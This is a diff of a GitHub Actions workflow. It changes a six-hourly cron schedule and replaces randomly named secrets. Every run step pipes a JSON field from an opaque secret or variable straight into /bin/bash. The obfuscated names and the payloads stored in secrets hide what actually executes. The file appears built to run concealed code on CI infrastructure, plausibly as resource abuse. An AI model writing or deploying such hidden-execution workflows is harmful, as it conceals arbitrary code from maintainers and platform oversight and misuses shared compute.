@@ -1,22 +1,24 @@
 name: zhongxiaoyan3456
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 5/6 * * *'
+    - cron: '24 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zhongxiaoyan3456
         env:
-          ttsl06014: ${{ secrets.ttsl06014 }}
+          dfpc53959: ${{ secrets.dfpc53959 }}
         run: |
-          echo $ttsl06014 | jq -r .dy90 | /bin/bash
-          echo $xf8 | jq -r .fjd37 | /bin/bash
-          echo $xh1026 | jq -r .vtgir81 | /bin/bash
-          echo $k947 | jq -r .o138 | /bin/bash
-          echo $aq1244 | jq -r .gmry7 | /bin/bash
+          echo $dfpc53959 | jq -r .yzdsw15722 | /bin/bash
+          echo $kjhdf944 | jq -r .dy131 | /bin/bash
+          echo $myc590 | jq -r .jsmq02 | /bin/bash
+          echo $jr894 | jq -r .yxnhl128 | /bin/bash
+          echo $c6541 | jq -r .fcjuk76003 | /bin/bash
+          echo $v5776 | jq -r .nlizk7068 | /bin/bash
+          echo $spo2 | jq -r .eys4885 | /bin/bash
+          echo $eyboz9 | jq -r .bu510 | /bin/bash
 
